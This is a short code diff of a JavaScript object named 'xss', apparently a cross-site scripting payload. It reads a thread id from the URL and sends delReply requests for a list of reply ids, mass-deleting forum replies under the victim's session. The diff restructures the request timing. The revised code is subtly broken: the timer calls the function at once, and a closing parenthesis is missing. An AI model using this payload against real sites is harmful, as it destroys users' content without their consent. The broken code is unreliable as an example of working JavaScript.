@@ -20,11 +20,13 @@ xss.prototype = {
 		var tid = location.href.split("&").map(function(index, data) {if(index.match("id")){return index;}})[1].split("=")[1];
 		for(var i = 0, l = ids.length; i<l; i++) {
 			var url = "/?c=ajax&a=delReply&id=" + ids[i]+"" + "&tid=" + tid+"";
-			setTimeout($.get(url, function(data) {
+			setTimeout(get(url), 20);
+		}
+		function get(url) {
+			$.get(url, function(data) {
 				console.log(data);
-			}), 20);
+			}
 		}
 	}
 }
 var x = new xss;
-
